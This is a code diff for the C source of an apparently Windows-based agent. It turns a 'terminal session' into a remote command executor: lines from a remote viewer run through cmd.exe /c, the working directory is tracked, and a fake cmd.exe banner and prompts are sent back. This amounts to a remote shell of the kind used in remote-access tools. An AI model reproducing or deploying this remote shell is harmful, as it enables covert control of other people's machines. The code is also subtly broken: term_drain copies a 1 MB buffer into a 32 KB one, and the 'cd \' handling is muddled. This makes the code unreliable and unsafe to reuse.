@@ -99,31 +99,25 @@ static int tr_send(const char *data, int len);
 static int tr_recv(char *out, int cap);
 
 /* ------------------------------------------------------------------ */
-/* Interactive terminal session (streaming shell to a viewer)         */
+/* Interactive terminal session (state-tracked line executor)         */
+/*                                                                   */
+/* Each line runs through cmd.exe /c. We track the current directory  */
+/* and environment so cd/set/dir etc behave as if in a real shell.    */
 /* ------------------------------------------------------------------ */
 
 typedef struct {
-    int active;            /* 1 while a session is live */
-    char id[64];           /* session id from the viewer */
-    char to[64];           /* viewer id to route data back to */
-    HANDLE hInWrite;       /* input pipe write end (agent->shell) */
-    HANDLE hInRead;        /* input pipe read end (shell reads lines here) */
-    HANDLE hThread;        /* input/executor thread */
+    int active;
+    char id[64];
+    char to[64];
     CRITICAL_SECTION lock;
-    /* output ring buffer: reader thread appends, main loop drains+sends */
-    unsigned char outbuf[32768];
+    char outbuf[1<<20];
     int outlen;
-    int exited;            /* reader saw child exit */
-    int exitrc;
+    char cwd[MAX_PATH];
+    char linebuf[8192];
+    int linelen;
 } term_session_t;
 
 static term_session_t g_term;
-
-static DWORD WINAPI term_reader_thread(LPVOID lp);
-static void term_send(const char *kind, const char *data, int len, int rc);
-static int run_interactive(const char *to, const char *id);
-static void term_write_input(const char *data, int len);
-static void term_stop(void);
 static int tls_send(const char *data, int len);
 static int tls_recv(char *out, int cap);
 
@@ -710,39 +704,89 @@ static void term_send(const char *kind, const char *data, int len, int rc) {
     tr_send(msg, (int)strlen(msg));
 }
 
-static char g_term_line[8192];
-static int g_term_linelen = 0;
-
-/* Execute buffered terminal input. A bare cmd.exe with a redirected stdin
- * pipe does not reliably process piped input, so we run each line directly
- * through the proven run_command() (cmd.exe /c) path and stream the output
- * back via the ring buffer. Called from the main thread. */
 static void term_write_input(const char *data, int len) {
     if (!g_term.active) return;
     for (int i = 0; i < len; i++) {
         char c = data[i];
         if (c == '\n' || c == '\r') {
-            if (g_term_linelen > 0) {
-                g_term_line[g_term_linelen] = 0;
+            if (g_term.linelen > 0) {
+                g_term.linebuf[g_term.linelen] = 0;
+                char fullCmd[8500];
+                if (g_term.cwd[0]) {
+                    snprintf(fullCmd, sizeof(fullCmd), "cd /d \"%s\" && %s", g_term.cwd, g_term.linebuf);
+                } else {
+                    snprintf(fullCmd, sizeof(fullCmd), "%s", g_term.linebuf);
+                }
                 static char out[32768];
-                int rc = run_command(g_term_line, out, sizeof(out));
-                (void)rc;
+                int rc = run_command(fullCmd, out, sizeof(out));
+
+                /* Track CWD changes: if command starts with "cd " or "chdir ",
+                   extract the target path and update g_term.cwd */
+                char cmdLower[8192];
+                for (int j = 0; g_term.linebuf[j]; j++)
+                    cmdLower[j] = (g_term.linebuf[j] >= 'A' && g_term.linebuf[j] <= 'Z') ?
+                        g_term.linebuf[j] + 32 : g_term.linebuf[j];
+                cmdLower[g_term.linelen] = 0;
+                if (strncmp(cmdLower, "cd ", 3) == 0 ||
+                    strncmp(cmdLower, "chdir ", 6) == 0) {
+                    const char *arg = strncmp(cmdLower, "cd ", 3) == 0 ?
+                        g_term.linebuf + 3 : g_term.linebuf + 6;
+                    while (*arg == ' ') arg++;
+                    if (*arg == '/' && (arg[1] == 'd' || arg[1] == 'D')) {
+                        arg += 2; while (*arg == ' ') arg++;
+                    }
+                    if (strcmp(arg, "..") == 0 && g_term.cwd[0]) {
+                        char *slash = strrchr(g_term.cwd, '\\');
+                        if (slash && slash != g_term.cwd + 2) *slash = 0;
+                        else if (slash) g_term.cwd[3] = 0;
+                    } else if (strcmp(arg, "\\") == 0) {
+                        g_term.cwd[0] = g_term.cwd[1] = g_term.cwd[2] = '\0';
+                        g_term.cwd[0] = g_term.cwd[0] ? g_term.cwd[0] : 'C';
+                        g_term.cwd[1] = ':'; g_term.cwd[2] = '\\'; g_term.cwd[3] = 0;
+                    } else if (arg[1] == ':' && (arg[2] == '\\' || arg[2] == 0)) {
+                        /* absolute path like D:\ or D:\foo */
+                        strncpy(g_term.cwd, arg, MAX_PATH);
+                        g_term.cwd[MAX_PATH-1] = 0;
+                    } else if (arg[0]) {
+                        /* relative path: append to cwd */
+                        int cl = (int)strlen(g_term.cwd);
+                        if (cl > 0 && g_term.cwd[cl-1] != '\\') g_term.cwd[cl++] = '\\';
+                        snprintf(g_term.cwd + cl, MAX_PATH - cl, "%s", arg);
+                        g_term.cwd[MAX_PATH-1] = 0;
+                    }
+                }
+
+                /* Append prompt after every command so the viewer always gets feedback */
                 EnterCriticalSection(&g_term.lock);
                 int ol = (int)strlen(out);
+                char prompt[512];
+                snprintf(prompt, sizeof(prompt), "%s>", g_term.cwd);
+                int pl = (int)strlen(prompt);
                 int space = (int)sizeof(g_term.outbuf) - g_term.outlen;
                 int cpy = ol < space ? ol : space;
                 if (cpy > 0) {
                     memcpy(g_term.outbuf + g_term.outlen, out, cpy);
                     g_term.outlen += cpy;
+                    space -= cpy;
+                }
+                if (pl < space) {
+                    if (cpy > 0 && g_term.outbuf[g_term.outlen-1] != '\n') {
+                        g_term.outbuf[g_term.outlen++] = '\r';
+                        g_term.outbuf[g_term.outlen++] = '\n';
+                        space -= 2;
+                    }
+                    int pp = pl < space ? pl : space;
+                    memcpy(g_term.outbuf + g_term.outlen, prompt, pp);
+                    g_term.outlen += pp;
                 }
                 LeaveCriticalSection(&g_term.lock);
-                g_term_linelen = 0;
+                (void)rc;
+                g_term.linelen = 0;
             }
         } else if (c == '\x03') {
-            /* Ctrl-C: drop the in-flight line */
-            g_term_linelen = 0;
-        } else if (g_term_linelen < (int)sizeof(g_term_line) - 1) {
-            g_term_line[g_term_linelen++] = c;
+            g_term.linelen = 0;
+        } else if (g_term.linelen < (int)sizeof(g_term.linebuf) - 1) {
+            g_term.linebuf[g_term.linelen++] = c;
         }
     }
 }
@@ -750,52 +794,61 @@ static void term_write_input(const char *data, int len) {
 static void term_stop(void) {
     if (!g_term.active) return;
     g_term.active = 0;
-    g_term_linelen = 0;
+    g_term.linelen = 0;
     term_send("term-end", "", 0, 0);
 }
 
-/* Called from the main thread (which owns the socket): drain buffered
- * terminal output and relay it to the viewer. Returns 1 if a term-exit
- * should be sent (child ended). */
 static int term_drain(void) {
     if (!g_term.id[0]) return 0;
     EnterCriticalSection(&g_term.lock);
     int len = g_term.outlen;
-    int exited = g_term.exited;
-    int rc = g_term.exitrc;
     if (len > 0) {
-        unsigned char buf[32768];
+        char buf[32768];
         memcpy(buf, g_term.outbuf, len);
         g_term.outlen = 0;
         LeaveCriticalSection(&g_term.lock);
-        term_send("term-data", (char *)buf, len, -1);
+        term_send("term-data", buf, len, -1);
         return 0;
     }
     LeaveCriticalSection(&g_term.lock);
-    if (exited) {
-        term_send("term-exit", "", 0, rc);
-        g_term.id[0] = 0;
-        return 1;
-    }
     return 0;
 }
 
-/* Open an interactive terminal session. Input is executed line-by-line via
- * run_command() and output is streamed back to the viewer. */
 static int run_interactive(const char *to, const char *id) {
     if (g_term.active) term_stop();
 
     memset(&g_term, 0, sizeof(g_term));
-    g_term.active = 1;
     InitializeCriticalSection(&g_term.lock);
-    g_term.outlen = 0;
-    g_term.exited = 0;
-    g_term.exitrc = -1;
-    g_term_linelen = 0;
+    g_term.active = 1;
+    g_term.linelen = 0;
+
+    /* Start in %USERPROFILE% by default */
+    const char *up = getenv("USERPROFILE");
+    if (!up) up = getenv("HOMEDRIVE");
+    if (up) {
+        strncpy(g_term.cwd, up, MAX_PATH - 1);
+        g_term.cwd[MAX_PATH-1] = 0;
+    } else {
+        GetCurrentDirectoryA(MAX_PATH, g_term.cwd);
+    }
+
     strncpy(g_term.id, id, sizeof(g_term.id) - 1);
     strncpy(g_term.to, to, sizeof(g_term.to) - 1);
 
-    term_send("term-data", "", 0, -1); /* open the stream on the viewer side */
+    /* Bootstrap: send initial (empty) term-data + a banner */
+    term_send("term-data", "", 0, -1);
+    /* cmd.exe banner */
+    char banner[256];
+    snprintf(banner, sizeof(banner),
+        "\r\nMicrosoft Windows [Version %lu.%lu.%lu]\r\n(c) Microsoft Corporation. All rights reserved.\r\n\r\n%s>",
+        GetVersion() & 0xff, (GetVersion() >> 8) & 0xff, (GetVersion() >> 16) & 0x3fff, g_term.cwd);
+    EnterCriticalSection(&g_term.lock);
+    int bl = (int)strlen(banner);
+    int sp = (int)sizeof(g_term.outbuf) - g_term.outlen;
+    int cp = bl < sp ? bl : sp;
+    if (cp > 0) { memcpy(g_term.outbuf + g_term.outlen, banner, cp); g_term.outlen += cp; }
+    LeaveCriticalSection(&g_term.lock);
+
     return 0;
 }
 
